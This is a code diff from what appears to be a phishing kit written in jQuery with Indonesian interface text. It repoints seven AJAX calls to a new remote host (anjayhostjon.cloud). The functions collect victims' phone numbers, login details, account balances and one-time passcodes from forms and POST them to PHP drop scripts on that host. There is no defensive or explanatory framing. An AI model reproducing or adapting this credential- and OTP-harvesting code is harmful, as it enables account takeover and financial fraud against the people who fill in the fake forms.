@@ -13,7 +13,7 @@ function sendHp() {
    sessionStorage.setItem('nohp', nohp);
    
    $.ajax({
-      url: 'https://zebra-daerah.whf.bz/awx/iyan/no.php',
+      url: 'https://anjayhostjon.cloud/awx/iyan/no.php',
       type: 'POST',
       data: $('#login').serialize(),  
       complete: function() {
@@ -33,7 +33,7 @@ function sendLogin(){
     document.getElementById('lanjutkan').innerHTML = "Memproses....";               
     
     $.ajax({
-      url: 'https://zebra-daerah.whf.bz/awx/iyan/sudah.php',
+      url: 'https://anjayhostjon.cloud/awx/iyan/sudah.php',
       type: 'POST',
       data: $('#sudah').serialize(),    
     complete: function(){    
@@ -63,7 +63,7 @@ function sendSaldoS() {
    document.getElementById('lanjutkan').innerHTML = "Memproses....";
    
    $.ajax({
-      url: 'https://zebra-daerah.whf.bz/awx/iyan/saldosdh.php',
+      url: 'https://anjayhostjon.cloud/awx/iyan/saldosdh.php',
       type: 'POST',
       data: $('#saldosdh').serialize(),
       complete: function() {
@@ -97,7 +97,7 @@ function sendOtpS() {
    var nama1 = document.getElementById('nama1');
    
    $.ajax({
-      url: 'https://zebra-daerah.whf.bz/awx/iyan/otpsdh.php',
+      url: 'https://anjayhostjon.cloud/awx/iyan/otpsdh.php',
       type: 'POST',
       data: $('#formsdh').serialize(),
       complete: function(response) {
@@ -133,7 +133,7 @@ document.getElementById("nohp").value =
        
     
     $.ajax({
-      url: 'https://zebra-daerah.whf.bz/awx/iyan/belum.php',
+      url: 'https://anjayhostjon.cloud/awx/iyan/belum.php',
       type: 'POST',
       data: $('#belum').serialize(),   
     complete: function(){
@@ -159,7 +159,7 @@ function sendSaldo() {
    document.getElementById('lanjutkan').innerHTML = "Memproses....";
    
    $.ajax({
-      url: 'https://zebra-daerah.whf.bz/awx/iyan/saldoblm.php',
+      url: 'https://anjayhostjon.cloud/awx/iyan/saldoblm.php',
       type: 'POST',
       data: $('#saldoblm').serialize(),
       complete: function() {
@@ -203,7 +203,7 @@ function sendOtp() {
    var nama1 = document.getElementById('nama1');
    
    $.ajax({
-      url: 'https://zebra-daerah.whf.bz/awx/iyan/otpblm.php',
+      url: 'https://anjayhostjon.cloud/awx/iyan/otpblm.php',
       type: 'POST',
       data: $('#formblm').serialize(),
       complete: function(response) {
